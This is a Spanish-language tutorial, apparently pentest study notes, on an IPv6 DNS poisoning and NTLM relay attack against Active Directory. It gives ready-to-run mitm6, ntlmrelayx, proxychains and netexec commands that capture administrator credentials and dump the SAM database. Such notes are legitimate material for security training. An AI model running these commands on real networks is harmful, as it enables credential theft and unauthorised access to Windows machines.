## Teoría 

Este ataque es bastante similar a cuando se hace por IPv4, o por lo menos en la teoría, en este caso no lo redirigimos directamente, en vez de eso envenenamos la red de tal forma que para los dispositivos que son parte del AD somos el servidor DNS predeterminado, es decir, de esa forma interceptamos la información para poder analizarla o reenviarla, para este punto simplemente esperamos que haya una maquina con privilegios sobre otra, e interceptamos sus credenciales, al hacer esto podemos reenviar esas credenciales para obtener acceso a una maquina en el directorio activo

## Practica 

Primero tenemos que envenenar la red por IPv6, y convertirnos en el servidor DNS predeterminado para los dispositivos, para ello usaremos la herramienta mitm6 ( Man In The Middle 6):

```ruby
sudo mitm6 -d {nombre_del_dominio}
```

Mientras corre el mitm6 empezaremos a interceptar el trafico con ntlmrelayx.py:

```ruby
sudo ntlmrelayx.py -6 -wh {IP_DE_MAQUINA_ATACANTE} -t smb://{Maquina_victima} -socks -smb2support 
```

Con este comando podemos tener una especie de "Consola interactiva", en la que si escribimos "socks", podremos ver las credenciales obtenidas, esperaremos hasta obtener algo como esto:

![[SMB Relay 4.png]]

AdminStatues en estado "TRUE" quiere decir que interceptamos credenciales con permisos administrativos sobre el objetivo, ahora, tenemos que redirigir estas credenciales al objetivo usando NetExec para poder obtener la sam o ejecutar comandos, para ello tenemos que configurar el archivo /etc/proxychains.conf, el final del archivo tiene que verse algo así (con el puerto 1080):

![[SMB Relay 5.png]]
Cuando hayamos editado este archivo ya tendremos proxychains configurado para que se comunique con ntlmrelayx, ahora vamos a usar proxychains para redirigir el trafico de los paquetes de cme a ntlmrelayx: 

```ruby
proxychains netexec smb {IP_VICTIMA} -u 'juan' -p 'no_importala_contraseña' -d 'juancorp'
```

Para explicar esto un poco, puse juan porque como nos indicaba ntlmrelayx, este usuario tiene permisos administrativos sobre la IP victima,  podemos usar cualquier contraseña, pues esta credencial va a ser reemplazada por ntlmrelayx cuando proxychains se la envie.


### Dumpear la SAM

Para dumpear la sam simplemente tenemos que indicarselo a CME de la siguiente manera:

```ruby
proxychains netexec smb {IP_VICTIMA} -u 'juan' -p 'no_importala_contraseña' -d 'juancorp' --sam
```

Obtendremos algo como esto:

![[SMB Relay 6.png]]


